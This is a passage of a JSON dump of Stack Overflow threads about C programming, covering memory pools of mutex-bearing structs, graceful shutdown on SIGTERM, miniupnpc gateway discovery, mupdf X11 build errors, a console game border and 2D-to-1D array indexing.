Or is the degradation really not enough to be concerned over?   The more I think about it, also, it&#39;s better to perform the individual malloc()&#39;s in the fact that the space is growable, with the intent to free them back down to 50 if the demand for them reduces. If I were to end up freeing the first one, I get the feeling that would result in a free of all 50 from the original malloc...   I appreciate the input, guys. I&#39;ll stick with individual malloc()&#39;s for each."}], "tags": [], "owner": {"reputation": 8430, "user_id": 3555525, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/3ba5dbe6c89022c8af714c8d841f9547?s=128&d=identicon&r=PG&f=1", "display_name": "Rishikesh Raje", "link": "https://stackoverflow.com/users/3555525/rishikesh-raje"}, "is_accepted": false, "score": 0, "last_activity_date": 1449661645, "creation_date": 1449661645, "answer_id": 34178090, "question_id": 34177730, "link": "https://stackoverflow.com/questions/34177730/pre-allocation-of-multiple-structs-same-struct/34178090#34178090", "title": "Pre-allocation of multiple struct&#39;s - same struct", "body": "<p>If you make a single malloc for 50 wrappers, what you will be creating is an array of wrappers, allocated in dynamic memory.</p>\n\n<p>To get the address of the i'th wrapper, you have to add <code>(i * sizeof(wrapper))</code> to the pointer returned by malloc. Using this address, you can fill the pointers *prev and *next for each of the 50 wrappers.</p>\n\n<p>However, while possible, I would not suggest it for the following reasons.</p>\n\n<ol>\n<li>It does not generate clean code. </li>\n<li>Adding further elements has to be handled separately</li>\n<li>Free will be simple if the list does not have to grow, but will have different cases if the list grows past 50.</li>\n</ol>\n"}, {"comments": [{"owner": {"reputation": 180, "user_id": 5565110, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d4fb39d1c89ba9883b693075c1fad580?s=128&d=identicon&r=PG&f=1", "display_name": "Jonny Whatshisface", "link": "https://stackoverflow.com/users/5565110/jonny-whatshisface"}, "edited": false, "score": 0, "creation_date": 1449686927, "post_id": 34178720, "comment_id": 56119652, "body": "Much appreciated... I just realised a scary thing, though. The intention was to use try mutex to loop through the wrapper list until one that&#39;s available is found, and allocate more as needed in pools of 20ish, then free them as the load reduced... However, what I&#39;m now realising is that if I do that with the mutex, I&#39;m going to have an issue with free&#39;ing the mutex afterwards. One thread does the job creation to send to the scheduler, and submits it. A worker thread will be the one to grab the wrapper, use it, and then try to free it. Can a thread free a mutex it didn&#39;t create?"}, {"owner": {"reputation": 48092, "user_id": 136208, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/8a30f566f1b7c9ae44cf245138850ba4?s=128&d=identicon&r=PG", "display_name": "AProgrammer", "link": "https://stackoverflow.com/users/136208/aprogrammer"}, "reply_to_user": {"reputation": 180, "user_id": 5565110, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d4fb39d1c89ba9883b693075c1fad580?s=128&d=identicon&r=PG&f=1", "display_name": "Jonny Whatshisface", "link": "https://stackoverflow.com/users/5565110/jonny-whatshisface"}, "edited": false, "score": 0, "creation_date": 1449690744, "post_id": 34178720, "comment_id": 56121767, "body": "Do you mean destroy or unlock? A thread unlocking a mutex that it hasn&#39;t locked if UB IIRC. Destroying should not be an issue, but I&#39;d be pay attention of not destroying a mutex which has threads locked on it."}, {"owner": {"reputation": 180, "user_id": 5565110, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d4fb39d1c89ba9883b693075c1fad580?s=128&d=identicon&r=PG&f=1", "display_name": "Jonny Whatshisface", "link": "https://stackoverflow.com/users/5565110/jonny-whatshisface"}, "edited": false, "score": 0, "creation_date": 1449770497, "post_id": 34178720, "comment_id": 56161780, "body": "Got ya... On that note, seems like I&#39;m going to have to allocate some worker threads to handle rummaging through the wrappers and then signal them from the other thread using them in order to have the originating thread that locked the mutex unlock it... Thank you for the input, very much appreciated. :)"}], "tags": [], "owner": {"reputation": 48092, "user_id": 136208, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/8a30f566f1b7c9ae44cf245138850ba4?s=128&d=identicon&r=PG", "display_name": "AProgrammer", "link": "https://stackoverflow.com/users/136208/aprogrammer"}, "is_accepted": false, "score": 1, "last_activity_date": 1449663736, "creation_date": 1449663736, "answer_id": 34178720, "question_id": 34177730, "link": "https://stackoverflow.com/questions/34177730/pre-allocation-of-multiple-structs-same-struct/34178720#34178720", "title": "Pre-allocation of multiple struct&#39;s - same struct", "body": "<ol>\n<li><p>You can allocate an array of 50 wrappers with <code>malloc(50*sizeof wrapper)</code></p></li>\n<li><p>They will be accessible as <code>p[0]</code>, ... <code>p[49]</code> if you store the result of malloc into a wrapper* p, you can also use <code>p</code>, ... <code>p+49</code> when you need pointers (such as when handling your linked list)</p></li>\n<li><p>That may complicate additional allocation and deallocation if you can't do it for the whole set at once, but such kind of memory pool is a common way to speed up allocation.</p></li>\n<li><p>Don't forget that you have to initialize the mutex, allocating it won't be enough.</p></li>\n</ol>\n"}], "owner": {"reputation": 180, "user_id": 5565110, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d4fb39d1c89ba9883b693075c1fad580?s=128&d=identicon&r=PG&f=1", "display_name": "Jonny Whatshisface", "link": "https://stackoverflow.com/users/5565110/jonny-whatshisface"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 578, "favorite_count": 0, "answer_count": 2, "score": -1, "last_activity_date": 1449663736, "creation_date": 1449660565, "question_id": 34177730, "link": "https://stackoverflow.com/questions/34177730/pre-allocation-of-multiple-structs-same-struct", "title": "Pre-allocation of multiple struct&#39;s - same struct", "body": "<p>I have the following:</p>\n\n<pre><code>typedef struct _wrapper {\n    int num;\n    foo *bar;\n    pthread_mutext_t lock;\n    struct _wrapper *prev;\n    struct _wrapper *next;\n} wrapper;\n</code></pre>\n\n<p>You can probably already tell where I'm going with this: I want to load, in advance, multiple wrappers at run time to save having to use malloc calls every time I need a wrapper. I'm going to use try_lock to cycle through to find an available wrapper, and after cycling through all and not finding any available, allocate an additional few with malloc() again and add them to the linked list of wrappers.</p>\n\n<p>I can build it properly with a for loop executing individual malloc() calls and building the linked list like that and simply modify *next and *prev for each cycle in the loop. What I'm trying to find out is if there's a way to essentially create them all within a single malloc() statement (i.e. (wrapper *)malloc(sizeof(wrapper)*50); . My problem there is - how do I go about building all of these wrappers and putting them at the correct locations in memory to ensure I don't stomp on top of the other(s) ? A shove in a good direction would be greatly appreciated.</p>\n"}, {"tags": ["c", "linux", "multithreading", "shutdown"], "comments": [{"owner": {"reputation": 165665, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "edited": false, "score": 0, "creation_date": 1449663573, "post_id": 34177713, "comment_id": 56103606, "body": "Designing a proper shutdown scheme into an application is very difficult if it&#39;s an afterthought after the application is finished. Organized shutdown should be built into the architecture from the very beginning."}, {"owner": {"reputation": 76134, "user_id": 417501, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/703f62ead2e305b1dff62066065a0554?s=128&d=identicon&r=PG", "display_name": "fuz", "link": "https://stackoverflow.com/users/417501/fuz"}, "reply_to_user": {"reputation": 165665, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "edited": false, "score": 0, "creation_date": 1449663761, "post_id": 34177713, "comment_id": 56103705, "body": "@DavidSchwartz Or, if you are Google, you design your application such that an ordinary shutdown is no different from an application crash (bot cases do not loose data)."}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1449667274, "post_id": 34177713, "comment_id": 56105893, "body": "What?  Only you know what your app requirements are.  If it does not matter if files are not flushed in your app, then who cares?"}], "answers": [{"tags": [], "owner": {"reputation": 39526, "user_id": 265804, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/156ef8708acdbf6a9ef76dad0d69609f?s=128&d=identicon&r=PG&f=1", "display_name": "Blagovest Buyukliev", "link": "https://stackoverflow.com/users/265804/blagovest-buyukliev"}, "is_accepted": false, "score": 2, "last_activity_date": 1449661276, "last_edit_date": 1449661276, "creation_date": 1449660911, "answer_id": 34177831, "question_id": 34177713, "link": "https://stackoverflow.com/questions/34177713/how-to-safely-close-a-large-c-application-in-linux/34177831#34177831", "title": "How to safely close a large c application in linux?", "body": "<p>The proper way is for your application to handle the <code>SIGTERM</code> signal, by setting a \"shutdown\" flag in its handler. In order to be safe against partial reads and writes, always use the <code>volatile sig_atomic_t</code> type for that purpose.</p>\n\n<p>On each iteration of the main loop you should be checking this flag and if it is set, stop accepting new connections and start releasing any resources and/or closing any connections. After you consider your program to be in a clean state, simply call <code>exit</code>.</p>\n\n<p><code>kill -9</code> sends a <code>SIGKILL</code> which cannot be handled by a process and performs an ungraceful kill. It just interrupts your program at whatever instruction it was and calls the OS to clean after it.</p>\n"}, {"comments": [{"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 1, "creation_date": 1449667569, "post_id": 34177837, "comment_id": 56106064, "body": "Oh, please have an upboat for the last paragraph!  Apps that cannot survive unexpected, unmanaged shutdowns are of bad  quality:)"}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 1, "creation_date": 1449667632, "post_id": 34177837, "comment_id": 56106099, "body": "Similarly, operating systems that cannot survive unexpected, unmanaged shutdowns are of bad quality."}], "tags": [], "owner": {"reputation": 76134, "user_id": 417501, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/703f62ead2e305b1dff62066065a0554?s=128&d=identicon&r=PG", "display_name": "fuz", "link": "https://stackoverflow.com/users/417501/fuz"}, "is_accepted": false, "score": 4, "last_activity_date": 1449660929, "creation_date": 1449660929, "answer_id": 34177837, "question_id": 34177713, "link": "https://stackoverflow.com/questions/34177713/how-to-safely-close-a-large-c-application-in-linux/34177837#34177837", "title": "How to safely close a large c application in linux?", "body": "<p>The <code>shutdown</code> command initiates a shutdown procedure (traditionally by invoking <code>init 0</code> but that might be no longer the case with systemd). This shutdown procedure consists roughly of the following parts:</p>\n\n<ol>\n<li>Disallow anyone from logging in</li>\n<li>Send a <code>SIGTERM</code> to all processes and wait a couple of seconds</li>\n<li>Send a <code>SIGKILL</code> to all processes and wait a couple of seconds</li>\n<li>Write all unwritten changes to disk</li>\n<li>turn off the system</li>\n</ol>\n\n<p>If your program needs to react to a shutdown, the best way is to catch the <code>SIGTERM</code> the operating system sens you. When you get a <code>SIGTERM</code>, assume that someone wants you to terminate. Once you got a <code>SIGTERM</code>, write all changes to disk and safely shut down your application. Try not to make this process too complex as the system only gives you a limited time to react to a <code>SIGTERM</code>.</p>\n\n<p>In general though, your program should deal with either itself or the system unexpectedly crashing. It should be written in a way that it can recover from a system crash with having inconsistent data structures. This is hard to get right and even a basic explanation of the strategies to do that would be too much for this answer.</p>\n"}], "owner": {"reputation": 51, "user_id": 3489035, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3a1018a01653e27f22de6e49dfa75ed?s=128&d=identicon&r=PG&f=1", "display_name": "Satya Sankar", "link": "https://stackoverflow.com/users/3489035/satya-sankar"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 136, "favorite_count": 1, "answer_count": 2, "score": 3, "last_activity_date": 1449661276, "creation_date": 1449660509, "question_id": 34177713, "link": "https://stackoverflow.com/questions/34177713/how-to-safely-close-a-large-c-application-in-linux", "title": "How to safely close a large c application in linux?", "body": "<p>I have large multi threaded c application , which basically does so many works, like local server, sql database communication, sip, and etc running on linux. \nI want to shutdown the linux machine, using \"sudo shutdown -h now\"</p>\n\n<p>shall i close, my c application before shutting down system? what is the safe way to close my application. </p>\n\n<p>If I close my application using \"sudo kill -9 pID\", then may be i loss some state of my application , my system may go into bad state.</p>\n\n<p>For example: suppose i am reading and writing from a file in c, and shutdown commands come, what will happen? should I detect shutdown siganl from my code, and close file first then shutdown.? what is the right way?</p>\n\n<p>Thanks </p>\n"}, {"tags": ["c", "networking", "upnp", "miniupnpc"], "comments": [{"owner": {"reputation": 836, "user_id": 1204780, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a9621f12e978009b9b6f09f424f76e60?s=128&d=identicon&r=PG&f=1", "display_name": "Megamozg", "link": "https://stackoverflow.com/users/1204780/megamozg"}, "edited": false, "score": 0, "creation_date": 1449809540, "post_id": 34177590, "comment_id": 56177102, "body": "Why the question is downvoted? Please, explain."}], "answers": [{"tags": [], "owner": {"reputation": 836, "user_id": 1204780, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a9621f12e978009b9b6f09f424f76e60?s=128&d=identicon&r=PG&f=1", "display_name": "Megamozg", "link": "https://stackoverflow.com/users/1204780/megamozg"}, "is_accepted": true, "score": 0, "last_activity_date": 1449813074, "creation_date": 1449813074, "answer_id": 34216944, "question_id": 34177590, "link": "https://stackoverflow.com/questions/34177590/find-all-upnp-gateways-with-miniupnp/34216944#34216944", "title": "Find all UPnP gateways with miniupnp", "body": "<p>Made a <a href=\"https://github.com/AlexEx54/miniupnp\" rel=\"nofollow\">fork</a> of miniupnpc. Added routine <code>GetValidConnectedIGDs</code>, which returns list of all gateway devices found.</p>\n"}], "owner": {"reputation": 836, "user_id": 1204780, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a9621f12e978009b9b6f09f424f76e60?s=128&d=identicon&r=PG&f=1", "display_name": "Megamozg", "link": "https://stackoverflow.com/users/1204780/megamozg"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 171, "favorite_count": 0, "accepted_answer_id": 34216944, "answer_count": 1, "score": -1, "last_activity_date": 1449813074, "creation_date": 1449660159, "question_id": 34177590, "link": "https://stackoverflow.com/questions/34177590/find-all-upnp-gateways-with-miniupnp", "title": "Find all UPnP gateways with miniupnp", "body": "<p>Discovering gateway devices process using miniupnp is as follows:</p>\n\n<ol>\n<li>Call <code>upnpDiscover(...)</code> to find all available devices which support UPnP protocol.</li>\n<li>Call <code>UPNP_GetValidIGD(...)</code> to get first gateway from this list.</li>\n</ol>\n\n<p>Is there any solution to get <strong>all</strong> gateways from list, obtained in step 1?</p>\n"}, {"tags": ["c", "macos", "mupdf"], "comments": [{"owner": {"reputation": 115642, "user_id": 299924, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/71fc84230717311db1410d7106273128?s=128&d=identicon&r=PG", "display_name": "trojanfoe", "link": "https://stackoverflow.com/users/299924/trojanfoe"}, "edited": false, "score": 0, "creation_date": 1449659739, "post_id": 34177382, "comment_id": 56101338, "body": "Did you search for a solution before posting?"}, {"owner": {"reputation": 41, "user_id": 5658802, "user_type": "registered", "profile_image": "https://graph.facebook.com/1019808154746993/picture?type=large", "display_name": "Richerd Namsseng", "link": "https://stackoverflow.com/users/5658802/richerd-namsseng"}, "reply_to_user": {"reputation": 115642, "user_id": 299924, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/71fc84230717311db1410d7106273128?s=128&d=identicon&r=PG", "display_name": "trojanfoe", "link": "https://stackoverflow.com/users/299924/trojanfoe"}, "edited": false, "score": 0, "creation_date": 1449659908, "post_id": 34177382, "comment_id": 56101434, "body": "Yes, I did. But I don&#39;t complete from theis solution"}], "answers": [{"comments": [{"owner": {"reputation": 7053, "user_id": 1162141, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/7db6bfbfbb420620e6df76c0e406098d?s=128&d=identicon&r=PG", "display_name": "technosaurus", "link": "https://stackoverflow.com/users/1162141/technosaurus"}, "edited": false, "score": 0, "creation_date": 1471873722, "post_id": 36978278, "comment_id": 65510157, "body": "Like adding -I/opt/X11/include/ to one of the CFLAGS or similar variables ... I&#39;d expect to need a similar -L flag added to LDFLAGS or LIBS variables."}], "tags": [], "owner": {"reputation": 13369, "user_id": 1579327, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/2672419fe5e9e6d5ce4d03c2e7aae7a2?s=128&d=identicon&r=PG", "display_name": "Paolo", "link": "https://stackoverflow.com/users/1579327/paolo"}, "is_accepted": false, "score": 0, "last_activity_date": 1462179257, "last_edit_date": 1462179257, "creation_date": 1462178271, "answer_id": 36978278, "question_id": 34177382, "link": "https://stackoverflow.com/questions/34177382/during-make-mupdf-fatal-error-x11-xlib-h-file-not-found-in-mac/36978278#36978278", "title": "During make mupdf, fatal error: X11/Xlib.h file not found in mac", "body": "<p>I'm on Mac OS X 10.9; </p>\n\n<p>The makefile looks for <strong>X11</strong> headers into <code>/usr/local/include/X11</code> instead of <code>/opt/X11/include/X11</code></p>\n\n<p>The quick fix is a symlink</p>\n\n<pre><code>$ sudo ln -s /opt/X11/include/X11 /usr/local/include/X11\n</code></pre>\n\n<p>You may also need this further fix for OpenGL headers</p>\n\n<pre><code>$ sudo ln -s /opt/X11/include/GL /usr/local/include/GL\n</code></pre>\n\n<p>Probably exists a more elegant solution by specifying headers location when invoking <code>make</code> but I couldn't find a way to do that.</p>\n"}, {"tags": [], "owner": {"reputation": 36037, "user_id": 292166, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/874bf67d9f9eeadcf2eb3d2a0a740502?s=128&d=identicon&r=PG", "display_name": "JosephH", "link": "https://stackoverflow.com/users/292166/josephh"}, "is_accepted": false, "score": 0, "last_activity_date": 1466506329, "creation_date": 1466506329, "answer_id": 37942438, "question_id": 34177382, "link": "https://stackoverflow.com/questions/34177382/during-make-mupdf-fatal-error-x11-xlib-h-file-not-found-in-mac/37942438#37942438", "title": "During make mupdf, fatal error: X11/Xlib.h file not found in mac", "body": "<p>The best solution for now is to use the X11 mupdf (and disable the openGL one):</p>\n\n<pre><code>make HAVE_GLFW=no\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 106, "user_id": 6056702, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/28aiX.jpg?s=128&g=1", "display_name": "Dean Wong", "link": "https://stackoverflow.com/users/6056702/dean-wong"}, "is_accepted": false, "score": 3, "last_activity_date": 1471889618, "last_edit_date": 1471889618, "creation_date": 1471872688, "answer_id": 39080961, "question_id": 34177382, "link": "https://stackoverflow.com/questions/34177382/during-make-mupdf-fatal-error-x11-xlib-h-file-not-found-in-mac/39080961#39080961", "title": "During make mupdf, fatal error: X11/Xlib.h file not found in mac", "body": "<pre><code>  make XCFLAGS=-I/opt/X11/include XLIBS=-L/opt/X11/lib \n</code></pre>\n"}], "owner": {"reputation": 41, "user_id": 5658802, "user_type": "registered", "profile_image": "https://graph.facebook.com/1019808154746993/picture?type=large", "display_name": "Richerd Namsseng", "link": "https://stackoverflow.com/users/5658802/richerd-namsseng"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1361, "favorite_count": 1, "answer_count": 3, "score": 4, "last_activity_date": 1471889618, "creation_date": 1449659585, "last_edit_date": 1449660560, "question_id": 34177382, "link": "https://stackoverflow.com/questions/34177382/during-make-mupdf-fatal-error-x11-xlib-h-file-not-found-in-mac", "title": "During make mupdf, fatal error: X11/Xlib.h file not found in mac", "body": "<p>I am installing muPDF.</p>\n\n<p>I gave an input like <code>make prefix=/usr/local install</code> in terminal</p>\n\n<p>I have installed XQuartz already</p>\n\n<p>But I get an error as follows</p>\n\n<pre><code>In file included from thirdparty/glfw/src/context.c:28:\nIn file included from thirdparty/glfw/src/internal.h:85:\nthirdparty/glfw/src/x11_platform.h:35:10: fatal error: 'X11/Xlib.h' file not found\n#include &lt;X11/Xlib.h&gt;\n     ^\n</code></pre>\n"}, {"tags": ["c", "console"], "comments": [{"owner": {"reputation": 54864, "user_id": 404970, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/o6X94.jpg?s=128&g=1", "display_name": "molbdnilo", "link": "https://stackoverflow.com/users/404970/molbdnilo"}, "edited": false, "score": 1, "creation_date": 1449657841, "post_id": 34176704, "comment_id": 56100048, "body": "Why do you need codeblocks and netbeans? There&#39;s a free edition of Visual Studio."}, {"owner": {"reputation": 53, "user_id": 2719403, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/f27b3a0bf27aa6af324fe6098f896b75?s=128&d=identicon&r=PG&f=1", "display_name": "Georgez", "link": "https://stackoverflow.com/users/2719403/georgez"}, "reply_to_user": {"reputation": 54864, "user_id": 404970, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/o6X94.jpg?s=128&g=1", "display_name": "molbdnilo", "link": "https://stackoverflow.com/users/404970/molbdnilo"}, "edited": false, "score": 0, "creation_date": 1449659413, "post_id": 34176704, "comment_id": 56101129, "body": "downloading VS 2015 UPDATE 1"}], "answers": [{"comments": [{"owner": {"reputation": 53, "user_id": 2719403, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/f27b3a0bf27aa6af324fe6098f896b75?s=128&d=identicon&r=PG&f=1", "display_name": "Georgez", "link": "https://stackoverflow.com/users/2719403/georgez"}, "edited": false, "score": 0, "creation_date": 1449687893, "post_id": 34182524, "comment_id": 56120200, "body": "oh i accidentally puted &gt; instead of &lt;. thanks , its exactly how i thought"}], "tags": [], "owner": {"reputation": 115, "user_id": 4859100, "user_type": "registered", "accept_rate": 60, "profile_image": "https://graph.facebook.com/1066841200011140/picture?type=large", "display_name": "guy ribak", "link": "https://stackoverflow.com/users/4859100/guy-ribak"}, "is_accepted": true, "score": 1, "last_activity_date": 1449674648, "creation_date": 1449674648, "answer_id": 34182524, "question_id": 34176704, "link": "https://stackoverflow.com/questions/34176704/id-like-some-help-in-a-basic-game-idea-in-c-beginner/34182524#34182524", "title": "I&#39;d like some help in a basic game idea in C. [beginner]", "body": "<pre><code>//include etc\n//main..\n//int i,j\n\nchar myarray[22][76] = { { ' ' } };\nfor (i = 0; i&lt;22; i++){\n    for (j = 0; j&lt;76; j++){\n        if (i == 0 || i == 21)\n            myarray[i][j] = '*';\n        else if (j == 0 || j == 75)\n            myarray[i][j] = '*';\n        printf(\"%c\", myarray[i][j]);\n    }\n\n    printf(\"\\n\");\n}\n</code></pre>\n"}], "owner": {"reputation": 53, "user_id": 2719403, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/f27b3a0bf27aa6af324fe6098f896b75?s=128&d=identicon&r=PG&f=1", "display_name": "Georgez", "link": "https://stackoverflow.com/users/2719403/georgez"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 98, "favorite_count": 0, "accepted_answer_id": 34182524, "answer_count": 1, "score": 0, "last_activity_date": 1449674648, "creation_date": 1449657608, "last_edit_date": 1449659088, "question_id": 34176704, "link": "https://stackoverflow.com/questions/34176704/id-like-some-help-in-a-basic-game-idea-in-c-beginner", "title": "I&#39;d like some help in a basic game idea in C. [beginner]", "body": "<p>So hello,</p>\n\n<p>I am trying to get some experience on C, im at bigginer level. </p>\n\n<p>I need so help if you will..</p>\n\n<p>1) id like to make a console based game, so I have a char 2d array and i want first of all my game to have some kind of border.. mean: 1st n' last row, 1st n'last line, I want to put some asterisks so I can make a simple border.</p>\n\n<p>Here is what I've tried:</p>\n\n<pre><code>  //include etc\n    //main..\n    //int i,j\n   char myarray[22][76]={{' '}};\n   for(i=0;i&gt;22;i++){\n      for(j=0;j&lt;76;j++){\n        if(i==0 || i==22)\n          myarray[i][j]='*';\n        else if(j==0 &amp;&amp; i&gt;0 || j==75 &amp;&amp; i&gt;0)\n          myarray[i][j]='*';\n        else\n        myarray[i][j]='';\n    }\n     printf(\"%d\",myarray[i][j]);\n     printf(\"\\n\");\n   }\n</code></pre>\n\n<p>-I think that i must erase i>0 in the conditions since the program wont enter else if untill i>0, cause of the if condition.\n-it might be completelly wrong but thats what i thought.</p>\n\n<p>2)\nsince I will have a player and treasures and traps, I want everytime my player moves the whole screen to be redrawn. But I dont want to be redrawn from the start i want it to be redrawn so it can show the current state of the game. ex. if the player has found a treasure then the screen must be drawn without the treasure on it and with the player at his current position.</p>\n\n<p>Do I need the (border,traps,treasures,player) in same function? and how I can achieve the redraw of the screen in each move?</p>\n\n<p>I run windows 10 and codeblocks+netbeans doesn't work at 10, I dont know why and I cant fix it atm , I tried online complier but they have limitation of code lines and excecution.</p>\n"}, {"tags": ["c++", "c", "arrays"], "comments": [{"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1449657542, "post_id": 34176484, "comment_id": 56099834, "body": "The conversion is the same as you have already done in the for loop: <code>grid[centerh * col + centerw] = &#39;o&#39;;</code>"}, {"owner": {"reputation": 5146, "user_id": 5089383, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/4d483ecc01086edbc775bd770c66b5e4?s=128&d=identicon&r=PG&f=1", "display_name": "JSF", "link": "https://stackoverflow.com/users/5089383/jsf"}, "edited": false, "score": 0, "creation_date": 1449657548, "post_id": 34176484, "comment_id": 56099838, "body": "A competent C++ programmer would write an accessor function to enable  2d access to a 1d array.  But either inside or instead of that function, the pattern you already used in one place should work everywhere.  I guess you copied that first change from someone without understanding it.  Maybe one more example will help:  Change <code>[centerh - 1][centerw - 1]</code> to <code>[(centerh - 1)*col+centerw - 1]</code>"}, {"owner": {"reputation": 309, "user_id": 5459423, "user_type": "registered", "accept_rate": 36, "profile_image": "https://www.gravatar.com/avatar/502d3ef40cd7b946e08b2d48cfb3e7ae?s=128&d=identicon&r=PG&f=1", "display_name": "askque", "link": "https://stackoverflow.com/users/5459423/askque"}, "reply_to_user": {"reputation": 5146, "user_id": 5089383, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/4d483ecc01086edbc775bd770c66b5e4?s=128&d=identicon&r=PG&f=1", "display_name": "JSF", "link": "https://stackoverflow.com/users/5089383/jsf"}, "edited": false, "score": 0, "creation_date": 1449676800, "post_id": 34176484, "comment_id": 56112882, "body": "thank @JSF another thing is there any difference between <code>grid[i * col + j]</code> and <code>grid[i * row + j]</code> when the 2d array is being converted to 1d ?"}, {"owner": {"reputation": 5146, "user_id": 5089383, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/4d483ecc01086edbc775bd770c66b5e4?s=128&d=identicon&r=PG&f=1", "display_name": "JSF", "link": "https://stackoverflow.com/users/5089383/jsf"}, "edited": false, "score": 0, "creation_date": 1449677048, "post_id": 34176484, "comment_id": 56113057, "body": "Yes, there is a very big difference.  If you are consistent, you can choose either <code>i*col+j</code> or <code>j*row+i</code> (where <code>i</code> represents a vertical position and <code>j</code> a horizontal position).  But you can&#39;t mix the two in different accesses to the same <code>grid</code> and you can&#39;t switch vertical and horizontal coordinates in a way inconsistent with switching the choice of multiplier (I think your <code>i*row+j</code> is that kind of inconsistent switch of coordinates, so always wrong, but I don&#39;t know without seeing the surrounding code)."}, {"owner": {"reputation": 5146, "user_id": 5089383, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/4d483ecc01086edbc775bd770c66b5e4?s=128&d=identicon&r=PG&f=1", "display_name": "JSF", "link": "https://stackoverflow.com/users/5089383/jsf"}, "edited": false, "score": 0, "creation_date": 1449677413, "post_id": 34176484, "comment_id": 56113295, "body": "In C, the really ugly macro suggestion by StephenG might be the best choice (depending on other design constraints).  In C++ something that terrible is definitely <b>NOT</b> a good choice.  This highlights the problem of putting <b>both C++ and C tags</b> on a question.  The answers are not the same."}], "answers": [{"tags": [], "owner": {"reputation": 34704, "user_id": 1746118, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/a4a3P.png?s=128&g=1", "display_name": "Naman", "link": "https://stackoverflow.com/users/1746118/naman"}, "is_accepted": false, "score": 1, "last_activity_date": 1449657549, "creation_date": 1449657549, "answer_id": 34176685, "question_id": 34176484, "link": "https://stackoverflow.com/questions/34176484/conversion-from-2d-array-to-1d/34176685#34176685", "title": "conversion from 2d array to 1d", "body": "<p>This converts your 2D grid into 1D :</p>\n\n<pre><code>grid1D[row*col];\ngrid2D[row][col];\n\nfor(int i = 0; i &lt; row; ++i)\n    for(int j = 0; j &lt; col; ++j)\n          grid1D[i * col + j] = grid2D[i][j];\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 881, "user_id": 5635258, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b69b37f21456c0333195948af74563b9?s=128&d=identicon&r=PG&f=1", "display_name": "StephenG", "link": "https://stackoverflow.com/users/5635258/stepheng"}, "is_accepted": false, "score": 1, "last_activity_date": 1449663861, "creation_date": 1449663861, "answer_id": 34178767, "question_id": 34176484, "link": "https://stackoverflow.com/questions/34176484/conversion-from-2d-array-to-1d/34178767#34178767", "title": "conversion from 2d array to 1d", "body": "<p>In C I would use macros and a 1D array s a basis for this sort of 